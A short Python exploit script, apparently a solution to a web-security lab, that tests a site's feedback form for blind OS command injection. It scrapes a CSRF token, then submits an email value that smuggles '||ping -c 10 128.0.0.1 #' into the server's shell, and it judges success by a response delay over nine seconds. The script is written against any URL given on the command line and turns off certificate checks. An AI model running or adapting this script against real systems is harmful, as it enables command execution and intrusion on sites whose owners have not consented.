import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf(s,url):
    payload = "/feedback"
    res = s.get(url + payload,verify = False)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf = soup.find("input",{'name':'csrf'})['value']
    print(csrf)
    return csrf

def blind_injec(s,url):
    params = {'csrf':get_csrf(s,url),'name':'name','email':'email@email.com||ping -c 10 128.0.0.1 #','subject':'subject','message':'message'}

    login_path = "/feedback/submit"

    res = s.post(url+login_path,data=params,verify=False)
    print(res.elapsed.total_seconds())
    if res.elapsed.total_seconds() > 9:
        print("[+]exploit successfull")
    else:
        print("[+]exploit failed")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("[+]usage:%s <url>"%sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.Session()
    print("[+]exploiting...")
    blind_injec(s,url)

if __name__ == "__main__":
    main()